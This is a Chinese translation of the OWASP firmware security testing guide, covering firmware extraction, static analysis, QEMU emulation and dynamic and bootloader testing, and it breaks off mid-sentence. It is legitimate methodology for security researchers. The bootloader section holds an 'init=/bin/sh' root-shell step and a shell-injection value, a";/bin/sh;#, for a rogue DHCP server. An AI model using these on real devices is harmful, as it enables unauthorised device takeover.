href="https://github.com/OWASP/IoTGoat">https://github.com/OWASP/IoTGoat</a><br /><strong><h3>· </h3></strong><h3>漏洞路由器固件靶机</h3><br /><strong><h3>·</h3></strong><h3> </h3><a href="https://github.com/praetorian-code/DVRF">https://github.com/praetorian-code/DVRF</a><br /><strong><h3>·</h3></strong><h3> 漏洞ARM路由器（DVAR）</h3><br /><strong><h3>·</h3></strong><h3> </h3><a href="https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html">https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html</a><br /><strong><h3>·</h3></strong><h3> ARM-X</h3><br /><strong><h3>·</h3></strong><h3> </h3><a href="https://github.com/therealsaumil/armx#downloads">https://github.com/therealsaumil/armx#downloads</a><br /><strong><h3>·</h3></strong><h3> Azeria Labs VM 2.0</h3><br /><strong><h3>· </h3></strong><a href="https://azeria-labs.com/lab-vm-2-0/">https://azeria-labs.com/lab-vm-2-0/</a><br /></div><div class='page'><h1 class='title level-4'>官方译文</h1><br/><h2>OWASP固件安全性测试指南</h2><br /><h3>固件安全评估，英文名称 firmware security testing methodology 简称 FSTM。该指导方法主要是为了安全研究人员、软件开发人员、顾问、爱好者和信息安全专业人员进行固件安全评估。</h3><br /><br /><strong><h2>前景</h2></strong><br /><br /><h3>我们基于 FSTM 进行测试流程如下：</h3><br /><table class="table"><tr><th>id</th><th>阶段</th><th>描述</th></tr><tr><td>1</td><td>信息收集</td><td>固件的相关技术文档的详细使用说明</td></tr><tr><td>2</td><td>获取固件</td><td>使用本文中介绍的多种办法获取固件</td></tr><tr><td>3</td><td>分析固件</td><td>固件的功能、特性</td></tr><tr><td>4</td><td>提取文件系统</td><td>从固件中获取文件系统</td></tr><tr><td>5</td><td>分析文件系统内容</td><td>静态分析提取的文件系统的配置文件和二进制文件中的漏洞</td></tr><tr><td>6</td><td>仿真固件</td><td>模拟固件文件和组件</td></tr><tr><td>7</td><td>动态分析</td><td>根据固件和应用程序接口进行动态测试</td></tr><tr><td>8</td><td>运行时分析</td><td>在设备运行时分析编译的二进制文件</td></tr><tr><td>9</td><td>二进制利用</td><td>利用上述手段发现的漏洞实现命令执行</td></tr></table><br /><br /><br /><br /><strong><h2>0x01：信息搜集</h2></strong><br /><br /><h3>可搜集与固件相关如下基础信息：</h3><br />• <h3>基于的CPU架构</h3><br /><br /><br />• <h3>操作系统平台</h3><br /><br /><br />• <h3>引导程序配置</h3><br /><br /><br />• <h3>硬件原理图</h3><br /><br /><br />• <h3>数据表</h3><br /><br /><br />• <h3>代码行估计</h3><br /><br /><br />• <h3>源代码存储库位置</h3><br /><br /><br />• <h3>第三方组建</h3><br /><br /><br />• <h3>开源许可证（GPL）</h3><br /><br /><br />• <h3>变更日志</h3><br /><br /><br />• <h3>FCC ID</h3><br /><br /><br />• <h3>设计和数据流程图</h3><br /><br /><br />• <h3>威胁建模</h3><br /><br /><br />• <h3>渗透测试报告之类</h3><br /><br /><br />• <h3>一些测试平台的测试（Jira、错误赏金平台 bugcrowd 或 hackerone ）</h3><br /><br /><br /><br /><h3>搜集方法：</h3><br />◇ <h3>利用开发团队及其内部产品线获取准确和最新的数据，及其项目设计原理和应用的安全设置，进而判断出与安全风险有关的信息和某些特定功能点。</h3><br /><br /><br />◇ <h3>开源情报（ </h3><code><h3>OSINT：Open source intelligence</h3></code><h3> ）技术手段来获取数据</h3><br /><br /><br /><br /><h3>在搜集信息中遇到开源软件的处理方式：</h3><br />◇ <h3>下载开源软件存储库，并根据代码库执行手动和自动静态分析</h3><br /><br /><br />◇ <h3>开源软件有其自身的静态分析工具 ，Example：</h3><br />▪ <h3>​</h3><a href="https://scan.coverity.com/">Coverity</a><h3> 对 </h3><a href="http://www.denx.de/wiki/U-Boot/WebHome">Das U-Boot</a><h3>进行的分析</h3><br /><br /><br /><br /><br /><br /><br /><a href="https://gblobscdn.gitbook.com/assets%2Ffirmware-security-testing-methodology%2F-M3hr9hiXkz1uxv8gwrp%2F-M3i4PAatvcctaVGCA7B%2F3.png?alt=media"><img src="images\687-1.png" alt="images\687-1.png" /></a><br /><br /><h3>U-Boot Coverity Scan</h3><br /><br /><br /><a href="https://gblobscdn.gitbook.com/assets%2Ffirmware-security-testing-methodology%2F-M3hr9hiXkz1uxv8gwrp%2F-M3i4PAb-o5S7tmKnJTp%2F4.png?alt=media"><img src="images\687-2.png" alt="images\687-2.png" /></a><br /><br /><h3>U-Boot Coverity Scan Analysis</h3><br /><br /><br />◇ <h3>semmle的</h3><a href="https://lgtm.com/#explore">LGTM</a><h3>对Dropbear的分析：</h3><br /><br /><br /><br /><a href="https://gblobscdn.gitbook.com/assets%2Ffirmware-security-testing-methodology%2F-M3hr9hiXkz1uxv8gwrp%2F-M3i4PAcg0523aFUx_Uh%2F5.png?alt=media"><img src="images\687-3.png" alt="images\687-3.png" /></a><br /><br /><h3>LGTM Dropbear Alerts</h3><br /><br /><br /><a href="https://gblobscdn.gitbook.com/assets%2Ffirmware-security-testing-methodology%2F-M3hr9hiXkz1uxv8gwrp%2F-M3i4PAdjZQFJz07-PUK%2F6.png?alt=media"><img src="images\687-4.png" alt="images\687-4.png" /></a><br /><br /><h3>LGTM Dropbear Results</h3><br /><br /><br /><h3>获取如上信息后便可进行粗略的威胁建模：标识出可攻击功能点和影响范围，方便测试时进行漏洞点的贯穿使用。</h3><br /><br /><strong><h2>0x02：获取固件</h2></strong><br /><br />◇ <h3>直接从开发团队、制造商/供应商或用户获取</h3><br /><br /><br />◇ <h3>使用制造商提供的项目从头编译</h3><br /><br /><br />◇ <h3>从供应商的support网站获取</h3><br /><br /><br />◇ <h3>从共享平台（ </h3><code><h3>Dropbox</h3></code><h3>、</h3><code><h3>box</h3></code><h3>、</h3><code><h3>Google drive</h3></code><h3>）根据二进制文件扩展名获取</h3><br />▪ <h3>从用户为了解决问题而上传固件到论坛、博客，或官方评论中获取</h3><br /><br /><br /><br /><br /><br />◇ <h3>设备更新进行中间人（</h3><code><h3>MITM</h3></code><h3>）获取</h3><br /><br /><br />◇ <h3>云提供商存储位置（如：</h3><code><h3>AWS</h3></code><h3>，全称</h3><code><h3>Amazon Web Services S3 buckets</h3></code><h3>）下载构建版本</h3><br /><br /><br />◇ <h3>通过 </h3><code><h3>UART</h3></code><h3>、</h3><code><h3>JTAG</h3></code><h3>、</h3><code><h3>PICit</h3></code><h3>等直接从硬件中提取</h3><br /><br /><br />◇ <h3>嗅探“硬件组件中的串行通信”中的更新服务器请求</h3><br /><br /><br />◇ <h3>通过移动应用程序中的硬编码接口</h3><br /><br /><br />◇ <h3>将固件从引导加载程序（如：U-boot ）转储到闪存或通过tftp的网络转储</h3><br /><br /><br />◇ <h3>从主板卸下闪存芯片（如：SPI ）或 MCU，以进行离线分析和数据提取</h3><br />▪ <h3>需要相应的芯片编辑器来存储 flash/MCU</h3><br /><br /><br /><br /><br /><br /><br /><br /><strong><h2>0x03：分析固件</h2></strong><br /><br /><h3>获取固件后需要分析其特征信息：固件文件类型、潜在的根文件元数据、编译基于的平台，使用 </h3><code><h3>binutils</h3></code><h3> 分析过程如下：</h3><br /><br /><br />file &lt;bin&gt;  <br />strings  <br />strings -n5 &lt;bin&gt;  <br />binwalk &lt;bin&gt;  <br />hexdump -C -n 512 &lt;bin&gt; &gt; hexdump.out  <br />hexdump -C &lt;bin&gt; | head # might find signatures in header<br /><br /><h3>若使用上述方法未提取出有用信息，可能由于以下原因：</h3><br />◇ <h3>二进制文件可能是</h3><code><h3>Bare Metal</h3></code><br /><br /><br />◇ <h3>二进制文件可能仅适用于带有自定义文件系统的实时操作系统（ </h3><code><h3>RTOS</h3></code><h3> ）平台</h3><br /><br /><br />◇ <h3>二进制文件可能是加密的</h3><br /><br /><br /><br /><h3>判断二进制文件是否是加密：</h3><br />◇ <h3>通过命令：</h3><code><h3>binwalk -E &lt;bin&gt;</h3></code><h3> ，判断其熵</h3><br />▪ <h3>低熵：不太可能被加密</h3><br /><br /><br />▪ <h3>高熵：可能被加密（或以某种方式压缩）</h3><br /><br /><br /><br /><br /><br />◇ <h3>也可以使用其他程序或在线程序（如：</h3><code><h3>binvis</h3></code><h3>）</h3><br />▪ <h3>​</h3><a href="https://code.google.com/archive/p/binvis/">https://code.google.com/archive/p/binvis/</a><h3>​</h3><br /><br /><br />▪ <h3>​</h3><a href="https://binvis.io/#/">https://binvis.io/#/</a><h3>​</h3><br /><br /><br /><br /><br /><br /><br /><br /><strong><h2>0x04：提取文件系统</h2></strong><br /><br />◇ <h3>固件：一个二进制文件的压缩包，文件系统是其中的一个组件，存储在二进制文件的特定偏移地址中，且有一定大小。</h3><br /><br /><br />◇ <h3>文件系统类型：squashfs , ubifs , romfs , rootfs , jffs2 , yaffs2 , cramfs , initramfs</h3><br /><br /><br /><br /><h3>为了分析固件内部相关文件系统数据、未编译代码和设备配置，需使用以下手动和自动方法提取固件文件系统：</h3><br />◇ <h3>偏移量和文件系统大小信息获取：</h3><br />▪ <h3>使用hexdump和grep等工具搜索特征信息</h3><br />- <h3>判断文件系统开始位置，如：Squashfs文件系统</h3><br />→ <h3>通过hexdump查找 </h3><code><h3>&quot;hsqs&quot;</h3></code><h3> 字符串，</h3><code><h3>hexdump -C binary ｜ grep -i &#39;hsqs&#39;</h3></code><br /><br /><br /><br /><br /><br />- <h3>使用dd命令将从该地址开始到文件末尾的内容全部转储下来</h3><br />→ <h3>dd if=binary bs=1 skip=92588 of=rt-n300-fs</h3><br /><br /><br /><br /><br /><br />- <h3>通过如上步骤，从二进制文件中获取到文件系统，使用 </h3><code><h3>unsquashfs</h3></code><h3> 查看整个文件系统</h3><br /><br /><br /><br /><br /><br /><br /><br /><br />◇ <h3>binwalk</h3><br />▪ <code><h3>binwalk -ev &lt;bin&gt;</h3></code><h3>，提取出的文件保存：</h3><code><h3>_binaryname/filesystemtype/</h3></code><h3>；</h3><br /><br /><br />▪ <h3>若是文件的标头没有魔术字节 ，需使用 </h3><code><h3>binwalk</h3></code><h3> 查找文件系统的偏移量，然后从二进制文件中分割压缩的文件系统，最后再手动提取出来。</h3><br />- <h3>分割</h3><br /><br /><br />dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs # or<br />dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs<br /><br /><br /><br />- <h3>提取</h3><br /><br /><br />For squashfs：<br />        unsquashfs dir.squashfs<br />CPIO archive files：<br />        cpio -ivd --no-absolute-filenames -F &lt;bin&gt;<br />For jffs2 filesystems：<br />        jefferson rootfsfile.jffs2<br />For ubifs filesystems with NAND flash：<br />        ubireader_extract_images -u UBI -s &lt;start_offset&gt; &lt;bin&gt;、ubidump.py &lt;bin&gt;<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><strong><h2>0x05：分析文件系统内容</h2></strong><br /><br /><br /><strong><h2>手动分析</h2></strong><br /><br /><h3>静态分析文件系统可从如下方面入手：</h3><br />◇ <h3>不安全网络守护程序，如：telnetd（有时会伪装成重命名二进制文件）</h3><br /><br /><br />◇ <h3>硬编码凭证（用户名、密码、API密钥、SSH密钥和后门变体）</h3><br /><br /><br />◇ <h3>硬编码的API端点和后端服务器详细信息</h3><br /><br /><br />◇ <h3>更新可用作入口点的服务器功能</h3><br /><br /><br />◇ <h3>查看未编译的代码并启动脚本以执行远程代码</h3><br /><br /><br />◇ <h3>提取已编译的二进制文件，使用反汇编程序脱机分析</h3><br /><br /><br /><br /><h3>同时，此过程中分析的结果，可为动态分析做基础准备。</h3><br /><br /><strong><h2>自动分析：firmwalker</h2></strong><br /><br /><code><h3>firmwalker</h3></code><h3> 分析内容范围如下：</h3><br />◇ <h3>etc/shadow and etc/passwd</h3><br /><br /><br />◇ <h3>etc/ssl</h3><br /><br /><br />◇ <h3>与 ssl 相关的文件，如：.pem .crt 等</h3><br /><br /><br />◇ <h3>搜索配置文件</h3><br /><br /><br />◇ <h3>寻找脚本文件</h3><br /><br /><br />◇ <h3>搜索其他 .bin 文件</h3><br /><br /><br />◇ <h3>查找 admin、password、remote、AWS key 等关键字</h3><br /><br /><br />◇ <h3>搜索物联网设备上使用的通用Web服务器</h3><br /><br /><br />◇ <h3>搜索常见的二进制文件，如：ssh、tftp、dropbear 等</h3><br /><br /><br />◇ <h3>搜索禁止的C函数</h3><br /><br /><br />◇ <h3>搜索常见的易受命令注入攻击的功能</h3><br /><br /><br />◇ <h3>搜索URL、电子邮件、IP地址</h3><br /><br /><br />◇ <h3>...</h3><br /><br /><br /><br /><h3>自动固件分析工具：</h3><code><h3>firmwalker</h3></code><h3>，</h3><code><h3>Aaron Guzman</h3></code><h3> 在原生代码基础上添加了一些其他的检查，可参照 </h3><a href="https://github.com/scriptingxss/firmwalker">firmwalker</a><h3>。</h3><br /><strong><h3>案例：在 OWASP IOTGoat 中使用 firewalker分析</h3></strong><br /><code><h3>firmwalk</h3></code><h3> 分析文件系统需使用绝对路径：</h3><br /><h3>​ </h3><code><h3>./firmwalker.sh /home/embedos/firmware/_IoTGoat-rpi-2.img.extracted/squashfs-root/</h3></code><br /><h3>分析结果如下：</h3><br /><a href="https://gblobscdn.gitbook.com/assets%2Ffirmware-security-testing-methodology%2F-M3hr9hiXkz1uxv8gwrp%2F-M3i4PAebGSR6HOgdcTk%2F7.png?alt=media"><img src="images\687-5.png" alt="images\687-5.png" /></a><br /><br /><br /><br /><br /><h3>分析结果存储在 </h3><code><h3>/data/</h3></code><h3> 目录下的两个文件：</h3><code><h3>firmwalker.txt</h3></code><h3> 和 </h3><code><h3>firmwalkerappsec.txt</h3></code><h3>，需手动检查这些文件。</h3><br /><br /><strong><h2>自动分析：FACT</h2></strong><br /><br /><h3>FACT 固件分析比较工具包分析内容如下：</h3><br />◇ <h3>标识软件组件（如：操作系统、CPU体系结构和第三方组件）及其关联的版本信息</h3><br /><br /><br />◇ <h3>从映像中提取固件文件系统</h3><br /><br /><br />◇ <h3>检测证书和私钥</h3><br /><br /><br />◇ <h3>检测CWE</h3><br /><br /><br />◇ <h3>基于提要和签名的漏洞检测</h3><br /><br /><br />◇ <h3>基于静态行为分析</h3><br /><br /><br />◇ <h3>固件版本和文件的比较（差异）</h3><br /><br /><br />◇ <h3>使用QEMU对文件系统中的二进制文件进行用户仿真</h3><br /><br /><br />◇ <h3>缓冲区溢出防护机制 NX, DEP, ASLR, stack canaries, RELRO, and FORTIFY_SOURCE</h3><br /><br /><br />◇ <h3>REST API</h3><br /><br /><br />◇ <h3>...</h3><br /><br /><br /><br /><strong><h3>案例：在EmbedOS 中使用FACT分析</h3></strong><br /><br /><br />cd ~/tools/FACT_core<br />sudo ./start_all_installed_fact_components<br /><br /><h3>浏览器访问：</h3><a href="http://127.0.0.1:5000/">http://127.0.0.1:5000</a><h3> ，</h3><br /><a href="https://gblobscdn.gitbook.com/assets%2Ffirmware-security-testing-methodology%2F-M3hr9hiXkz1uxv8gwrp%2F-M3i4PAfhubVQjCd0bcy%2F8.png?alt=media"><img src="images\687-6.png" alt="images\687-6.png" /></a><br /><br /><h3>FACT Dashboard</h3><br /><br /><br /><h3>将固件上传到FACT进行分析（可以将带有文件系统的完整固件）</h3><br /><a href="https://gblobscdn.gitbook.com/assets%2Ffirmware-security-testing-methodology%2F-M3hr9hiXkz1uxv8gwrp%2F-M3i4PAhuT9P30U_WCdt%2F10.png?alt=media"><img src="images\687-7.png" alt="images\687-7.png" /></a><br /><br /><h3>FACT Upload</h3><br /><br /><br /><h3>根据给FACT硬件资源，扫描时间会相应不同</h3><br /><a href="https://gblobscdn.gitbook.com/assets%2Ffirmware-security-testing-methodology%2F-M3hr9hiXkz1uxv8gwrp%2F-M3i4PAhuT9P30U_WCdt%2F10.png?alt=media"><img src="images\687-8.png" alt="images\687-8.png" /></a><br /><br /><h3>FACT IoTGoat</h3><br /><br /><br /><h3>FACT分析结果</h3><br /><a href="https://gblobscdn.gitbook.com/assets%2Ffirmware-security-testing-methodology%2F-M3hr9hiXkz1uxv8gwrp%2F-M3i4PAia3qpfdmwAqIM%2F11.png?alt=media"><img src="images\687-9.png" alt="images\687-9.png" /></a><br /><br /><h3>FACT IoTGoat Exploit Mitigation Results</h3><br /><br /><br /><br /><strong><h2>二进制文件分析：</h2></strong><br /><br />◇ <h3>可使用工具： </h3><code><h3>IDA Pro</h3></code><h3>、</h3><code><h3>Ghidra</h3></code><h3>、</h3><code><h3>Hopper</h3></code><h3>、</h3><code><h3>Capstone</h3></code><h3> 或 </h3><code><h3>binary Ninja</h3></code><h3> 进行分析。</h3><br />▪ <h3>使用Ghidra对二进制文件“shellback”的分析如下</h3><br /><br /><br /><br /><br /><br /><br /><a href="https://gblobscdn.gitbook.com/assets%2Ffirmware-security-testing-methodology%2F-M3hr9hiXkz1uxv8gwrp%2F-M3i4PAjBP2Y0kvZrD6l%2F12.png?alt=media"><img src="images\687-10.png" alt="images\687-10.png" /></a><br /><br /><h3>Shellback Ghidra Analysis</h3><br /><br /><br />◇ <h3>二进制文件选取及分析内容：可以选择从 </h3><code><h3>FACT</h3></code><h3> 获取的可疑内容，或针对漏洞利用点进行查找分析，如：</h3><br />▪ <h3>系统调用、字符串、函数列表、易产生内存损坏，对 </h3><code><h3>system()</h3></code><h3> 或类似函数调用等。</h3><br /><br /><br /><br /><br /><br />◇ <h3>分析二进制文件的常见功能点</h3><br />▪ <h3>是否启用 </h3><code><h3>Stack canaries</h3></code><h3>（堆栈保护机制）</h3><br /><br /><br />readelf -aW bin/*| grep stack_chk_fail<br />mips-buildroot-linux-uclibc-objdump -d bin/binary | grep stack_chk_fail<br /><br /><br /><br />▪ <h3>是否启用 </h3><code><h3>Position-independent executable (PIE)</h3></code><h3> 地址无关可执行文件</h3><br />- <h3>PIE disabled</h3><br /><br /><br />readelf -h &lt;bin&gt; | grep -q &#39;Type:[[:space:]]*EXEC&#39;<br /><br /><br /><br />- <h3>PIE enabled</h3><br /><br /><br />readelf -h &lt;bin&gt; | grep &#39;Type:[[:space:]]*DYN&#39;<br /><br /><br /><br /><br /><br /><br />▪ <h3>DSO（dynamic shared object）动态共享目标文件</h3><br /><br /><br />readelf -d &lt;bin&gt; | grep -q &#39;DEBUG&#39;<br /><br /><br /><br />▪ <h3>Symbols 动态链接库和符号</h3><br /><br /><br />readelf --syms &lt;bin&gt;<br />nm &lt;bin&gt;<br /><br /><br /><br />▪ <h3>可识别的字符串</h3><br />- <h3>-el 指定 16 位宽的小端字符（如：UTF-16）</h3><br /><br /><br />- <h3>-eb 使用大端</h3><br /><br /><br />- <h3>将任何大于 16 的 ASCII 字符串打印到 stdout</h3><br /><br /><br />- <h3>-t 将返回文件中字符串的偏移量</h3><br /><br /><br />- <h3>-tx 以十六进制格式返回，-td 以八进制和十进制表示 T-to</h3><br /><br /><br />- <h3>与十六进制编辑器进行交叉引用，或字符串在文件中的位置</h3><br /><br /><br /><br /><br /><br />▪ <h3>是否启用 Non-executable (NX) （应该是一种数据保护 DEP）</h3><br /><br /><br />readelf -lW bin/&lt;bin&gt;| grep STACK<br /><br /><h3>判断堆栈是否可执行，</h3><code><h3>E</h3></code><h3> 代表可执行：</h3><code><h3>GNU_STACK 0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4</h3></code><br /><br /><br />execstack bin/*<br />bin/ash<br />bin/busybox<br /><br /><br /><br />▪ <h3>RELRO ( RELocation Read-Only，只读重定位)（一种用于加强对二进制数据段的保护技术）配置</h3><br />- <h3>完整 RELRO</h3><br /><br /><br />readelf -d binary | grep BIND_NOW<br /><br /><br /><br />- <h3>部分 RELRO</h3><br /><br /><br />readelf -d binary | grep GNU_RELRO<br /><br /><br /><br /><br /><br /><br /><br /><br /><br />◇ <h3>自动检查上述二进制属性的脚本 </h3><a href="https://github.com/slimm609/checksec.sh">checksec.sh</a><h3>，如下示例：</h3><br /><br /><br /><br /><br /><br /> ./checksec --file=/home/embedos/firmware/_IoTGoat-x86-generic-combined-squashfs.img.extracted/squashfs-root/bin/busybox<br />​<br />./checksec --file=/home/embedos/firmware/_IoTGoat-x86-generic-combined-squashfs.img.extracted/squashfs-root/usr/bin/shellback<br /><br /><a href="https://gblobscdn.gitbook.com/assets%2Ffirmware-security-testing-methodology%2F-M3hr9hiXkz1uxv8gwrp%2F-M3i4PAks21G4CIRxCb1%2F13.png?alt=media"><img src="images\687-11.png" alt="images\687-11.png" /></a><br /><br /><h3>Checksec.sh</h3><br /><br /><br /><h3>对于 Microsoft 二进制文件（EXE、DLL），使用 </h3><a href="https://github.com/NetSPI/PESecurity">PESecurity</a><h3> 检查 </h3><code><h3>ASLR</h3></code><h3>, </h3><code><h3>DEP</h3></code><h3>, </h3><code><h3>SafeSEH</h3></code><h3>, </h3><code><h3>StrongNaming</h3></code><h3>, </h3><code><h3>Authenticode</h3></code><h3>, </h3><code><h3>Control Flow Guard</h3></code><h3> 和 </h3><code><h3>HighEntropyVA</h3></code><h3>。</h3><br /><br /><strong><h2>0x06：仿真固件</h2></strong><br /><br /><h3>为了确定及验证上面的详细信息、线索、潜在的漏洞，必需模拟固件及其封装的二进制文件。</h3><br /><h3>如下列出仿真固件的方法：</h3><br />◇ <h3>部分仿真（</h3><code><h3>user mode</h3></code><h3>）—仿真从固件提取的文件系统中的二进制文件：</h3><code><h3>/usr/bin/shellback</h3></code><br /><br /><br />◇ <h3>完整的系统仿真—完整的固件仿真和利用伪造的</h3><code><h3>NVRAM</h3></code><h3>启动配置</h3><br /><br /><br />◇ <h3>由于硬件或体系结构的依赖性，</h3><code><h3>user mode</h3></code><h3> 或 </h3><code><h3>system mode</h3></code><h3> 可能无法仿真固件成功。在这种情况下，可以将根文件系统或特定二进制文件传输到与目标固件的架构和字节序匹配的物理设备中进行测试，除了物理设备外，也可以使用与目标固件相同体系结构或字节序的预构件虚拟机。</h3><br /><br /><br /><br /><br /><strong><h2>部分仿真（ user mode ）</h2></strong><br /><br />◇ <h3>获取目标的 CPU 架构和字节序，然后选择适当的 QEMU 仿真二进制文件</h3><br />▪ <h3>CPU 架构获取：</h3><br /><br /><br />binwalk -Y &lt;bin&gt; <br />readelf -h &lt;bin&gt;<br /><br /><code><h3>el</h3></code><h3> 代表： </h3><code><h3>little endian</h3></code><h3> ，</h3><code><h3>eb</h3></code><h3> 代表：</h3><code><h3>big endian</h3></code><br /><br /><br />▪ <h3>字节序的获取：</h3><br />- <h3>使用 binwalk 识别打包的固件二进制文件（不是提取出的文件系统中的二进制文件）</h3><br /><br /><br />binwalk -Y UPG_ipc8120p-w7-M20-hi3516c-20160328_165229.ov<br /><br /><br />◇ <h3>确定了 CPU 的体系结构和字节序后，找适用的 QEMU 二进制文件来执行部分仿真（从文件系统中提取出的二进制文件）</h3><br />▪ <h3>QEMU 二进制文件通常所在目录：</h3><code><h3>/usr/local/qemu-arch</h3></code><h3> 或</h3><code><h3>/usr/bin/qemu-arch</h3></code><br /><br /><br />▪ <h3>将 QEMU 二进制文件复制到提取的文件系统的根目录中</h3><br /><br /><br />cd /home/embedos/firmware/_DIR850L_REVB_FW207WWb05_h1ke_beta1.decrypted.extracted/squashfs-root <br />cp /usr/bin/qemu-arm-static .<br /><br /><br /><br />▪ <h3>执行 ARM 二进制文件（或其他的体系结构）使用 QEMU 和 chroot 进行仿真</h3><br /><br /><br />sudo chroot . ./qemu-arch &lt;binarytoemulate&gt;<br /><br /><br /><br /><br /><br /><br /><br /><strong><h3>Example：</h3></strong><br />◇ <h3>busybox</h3><br /><br /><br /><br /><br /><br />sudo chroot . ./qemu-arm-static bin/busybox ls<br /><br />◇ <h3>shellback 开启5515上的侦听服务</h3><br /><br /><br /><br /><br /><br />sudo chroot . ./qemu-arm-static usr/bin/shellback<br /><br /><h3>​ 使用 netcat 尝试连接该服务</h3><br /><br /><br />sudo lsof -i :5515<br />nc -nv 127.0.0.1 5515<br /><br />◇ <h3>MIPS CGI 二进制文件，向该文件发出POST请求</h3><br /><br /><br /><br /><br /><br />sudo chroot . ./qemu-mips-static -E REQUEST_METHOD=&quot;POST&quot; -E REQUEST_URI=&lt;request_uri&gt; -E REMOTE_ADDR=&lt;ip_addr&gt; -E HTTP_COOKIE=&lt;custom_cookie&gt; -g &lt;port&gt; &lt;path to cgi binary&gt;<br /><br /><h3>通过上述手段模拟了目标二进制文件，可以使用其应用程序和网络接口，与其进行交互。</h3><br /><br /><strong><h2>全系统仿真（ system mode ）</h2></strong><br /><br /><h3>使用自动化工具来进行固件的完整仿真</h3><br /><h3>自动化工具：</h3><code><h3>firmadyne</h3></code><h3>、固件分析工具包、ARM-X 固件仿真框架，这些工具实质上是 QEMU 和其他环境功能 （如：nvram ）的包装器。</h3><br />◇ <h3>​</h3><a href="https://github.com/attify/firmware-analysis-toolkit">firmware-analysis-toolkit</a><h3>​</h3><br /><br /><br />◇ <h3>​</h3><a href="https://github.com/therealsaumil/armx/">armx</a><h3>​</h3><br /><br /><br />◇ <h3>​</h3><a href="https://github.com/firmadyne/firmadyne">firmadyne</a><h3>​</h3><br /><br /><br />◇ <h3>​</h3><a href="https://github.com/qilingframework/qiling#qltool">qltool</a><h3>​</h3><br /><br /><br /><br /><h3>需注意：固件中包含不常见的压缩文件系统或不支持的体系结构，可能需要修改这些工具</h3><br /><br /><strong><h2>0x07：动态分析</h2></strong><br /><br /><h3>设备在正常运行或者在仿真环境中运行中的动态测试，此阶段的测试可能会由于项目和访问级别有所差异。</h3><br /><strong><h3>分析手段：</h3></strong><br />◇ <h3>篡改引导程序配置</h3><br /><br /><br />◇ <h3>Web 和 API 测试</h3><br /><br /><br />◇ <h3>模糊测试（网络和应用程序服务）</h3><br /><br /><br />◇ <h3>使用各种工具集进行的主动扫描以获取提升的访问权限或代码执行</h3><br />▪ <code><h3>Burp Suite</h3></code><br /><br /><br />▪ <code><h3>OWASP ZAP</h3></code><br /><br /><br />▪ <code><h3>Commix</h3></code><br /><br /><br />▪ <code><h3>Fuzzers such as - American fuzzy loop (AFL)</h3></code><h3>、</h3><br /><br /><br />▪ <h3>Network and protocol fuzzers such as - </h3><a href="https://github.com/Cisco-Talos/mutiny-fuzzer">Mutiny</a><h3>, </h3><a href="https://github.com/jtpereyda/boofuzz">boofuzz</a><h3>, and </h3><a href="https://github.com/cisco-sas/kitty">kitty</a><h3>​</h3><br /><br /><br />▪ <code><h3>Nmap</h3></code><br /><br /><br />▪ <code><h3>NCrack</h3></code><br /><br /><br />▪ <code><h3>Metasploit</h3></code><br /><br /><br />▪ <h3>...</h3><br /><br /><br /><br /><br /><br /><br /><br /><strong><h2>嵌入式Web应用程序测试</h2></strong><br /><br /><strong><h3>检查方向：</h3></strong><br />◇ <h3>诊断和故障排除页面可能存在命令注入</h3><br /><br /><br />◇ <h3>验证和授权方案对整个固件中的应用程序和操作系统平台的相同框架进行验证</h3><br /><br /><br />◇ <h3>默认的用户名、密码</h3><br /><br /><br />◇ <h3>在网页执行目录遍历或文件读取，以识别调试或测试功能</h3><br /><br /><br />◇ <h3>在 SOAP/XML 和 API 传输中的输入检查 ，如：XSS 和 XXE</h3><br /><br /><br />◇ <h3>跟踪观察应用程序中的参数查看异常点和堆栈溢出点</h3><br />▪ <h3>常见的 C/C++ 漏洞、常见的嵌入式 Web 应用程序的有效负载，如：内存损坏漏洞、格式字符串缺陷、整数溢出</h3><br /><br /><br /><br /><br /><br /><br /><br /><strong><h2>引导加载程序测试</h2></strong><br /><br /><h3>修改设备的引导加载程序时，可以进行如下操作：</h3><br />◇ <h3>在引导过程中加 “0”、空格、或其他标识的“魔术代码”来获取 shell</h3><br /><br /><br />◇ <h3>修改配置以执行 shell 命令，如：引导参数末尾 “init=/bin/sh”</h3><br />#printenv<br />#setenv bootargs=console=ttyS0,115200 mem=63M root=/dev/mtdblock3<br />mtdparts=sflash:&lt;partitiionInfo&gt; rootfstype=&lt;fstype&gt; hasEeprom=0 5srst=0 init=/bin/sh<br />#saveenv<br />#boot<br /><br />◇ <h3>设置一个 tftp 服务器，从本地通过网络加载远程图像（前提是设备有网络访问权限）</h3><br />#setenv ipaddr 192.168.2.2 #local IP of the device<br />#setenv serverip 192.168.2.1 #tftp server IP<br />#saveenv<br />#reset<br />#ping 192.168.2.1 #check if network access is available<br />#tftp ${loadaddr} uImage-3.6.35 #loadaddr takes two arguments: the address to load the file into and the filename of the image on the TFTP server<br /><br />◇ <h3>使用 ubootwrite.py 编写 uboot-image 并且安装修改过的固件来获取 root</h3><br />◇ <a href="https://github.com/HorstBaerbel/ubootwrite">https://github.com/HorstBaerbel/ubootwrite</a><br /><br /><br />◇ <h3>查看启用的调试功能，如：详细记录、加载任意内核、从不受信任的来源引导</h3><br /><br /><br />◇ <h3>使用警告：使用引脚连接主板，观察设备启动顺序，在内核解压缩之前，将连接主板的引脚短路或者连接到 SPI 闪存芯片上的数据引脚（DO）</h3><br /><br /><br />◇ <h3>使用警告：使用引脚连接主板，观察设备启动顺序，在内核解压缩之前，在 U-boot 对 UBI 映像解压缩时，将连接主板的引脚短路或连接到 NAND 闪存芯片的引脚 8 和 9</h3><br />▪ <h3>在短接引脚之前请查看 NAND 闪存芯片的数据表</h3><br /><br /><br /><br /><br /><br />◇ <h3>使用恶意参数配置恶意 DHCP 服务器作为设备在 PXE 引导期间提取的输入</h3><br />▪ <h3>使用 Metasploit DHCP 辅助服务器，进行命令注入，比如修改参数 </h3><code><h3>FILENAME</h3></code><h3> 为 </h3><code><h3>a&quot;;/bin/sh;#</h3></code><h3>，来测试设备启动过程的输入验证</h3><br /><br /><br /><br /><br /><br /><br /><br /><strong><h2>固件完整性测试</h2></strong><br /><br /><h3>尝试上传自定义固件或编译过的二进制文件，来检测完整性或签名验证漏洞。</h3><br /><h3>可设置后门点：启动脚本引用、某些链接、依赖不受信任的安装位置（如：SD 